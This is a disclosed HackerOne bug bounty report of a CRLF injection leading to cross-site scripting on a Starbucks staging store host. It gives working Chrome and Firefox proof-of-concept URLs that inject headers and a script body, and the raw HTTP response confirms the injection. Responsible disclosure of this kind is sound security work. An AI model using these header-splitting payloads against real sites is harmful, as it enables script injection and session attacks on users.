# [stagecafrstore.starbucks.com] CRLF Injection, XSS

## Report Details
- **Report ID**: 192667
- **URL**: https://hackerone.com/reports/192667
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-20T08:42:53.161Z
- **Disclosed**: 2018-01-22T22:31:42.805Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
**Chrome PoC**
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
```

**FireFox PoC**
```
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```

**HTTP Response**
```http
HTTP/1.1 301 Content-moved
Date: Tue, 20 Dec 2016 08:40:11 GMT
Server: WebServer
X-Original-link: /%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
X-XSS-Protection: 0
Location: //x:1
Content-Type: text/html
Content-Length: 98

<script>alert(document.domain)</script>
Content-Length: 0
X-OneLinkServiceType: onelink.fcgi
```

## Attachments
- Screenshot_at_12-42-40.png
